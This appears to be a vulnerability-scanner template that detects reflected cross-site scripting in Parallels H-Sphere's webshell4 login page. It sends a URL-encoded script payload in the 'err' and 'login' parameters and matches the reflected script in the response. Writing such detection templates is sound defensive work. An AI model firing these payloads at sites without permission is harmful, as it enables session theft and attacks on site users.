id: parallels-hsphere-xss
name: Parallels H-Sphere - Cross-Site Scripting
severity: high
confidence: confirmed
description: Parallels H-Sphere contains multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize
  user-supplied data. An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting
  user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and
  to launch other attacks.
reference: CWE-79
tags:
- hsphere
- xss
- edb
- parallels
- vuln
requests:
- method: GET
  path: /webshell4/login.php?err=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
  matchers: &id001
  - type: body
    words:
    - value="\"><script>alert(document.domain)</script>
  - type: header
    words:
    - text/html
  - type: status
    status:
    - 200
  condition: and
- method: GET
  path: /webshell4/login.php?login=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
  matchers: *id001
  condition: and
